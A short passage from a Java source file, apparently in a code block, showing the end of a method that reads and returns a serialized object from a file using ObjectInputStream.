        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```
